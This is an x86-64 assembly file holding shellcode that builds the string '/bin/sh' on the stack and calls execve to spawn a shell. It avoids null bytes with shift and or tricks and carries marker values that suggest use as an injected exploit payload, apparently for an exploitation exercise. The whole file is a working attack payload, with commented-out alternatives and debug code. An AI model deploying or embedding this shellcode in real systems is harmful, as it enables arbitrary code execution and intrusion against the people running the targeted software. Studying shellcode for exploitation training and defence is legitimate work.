	.global _start
	.text
_start:
	movq $0xaabbccdd, %rbx

	# get string "/bin/sh" in stack
	# movl $0x68732f, %eax   		# half string
	# movq $1073741824, %rbx 		# 2^30
	# mulq %rbx
	# movq $4, %rbx			# 2^2
	# mulq %rbx
	# orq $0x6e69622f, %rax
	# pushq %rax

	movl $0xff68732f, %eax
	shlq $40, %rax
	shrq $8, %rax
	orq $0x6e69622f, %rax
	pushq %rax

	# print check
	# movq %rsp, %rsi
	# movq $1, %rax
	# movq $1, %rdi
	# movq $8, %rdx
	# syscall


	# filename argument: rdi
	movq %rsp, %rdi
	 
	# argv argument: rsi
	xorq %rax, %rax
	pushq %rax
	pushq %rdi
	movq %rsp, %rsi

	# envp argument: rdx
	xorq %rdx, %rdx

	movl $0xffffff3b, %eax  		# sys_execve
	shlq $56, %rax
	shrq $56, %rax
	syscall
	movq $0xaabbccdd, %rbx


	# exit
	# movq $60, %rax
	# syscall
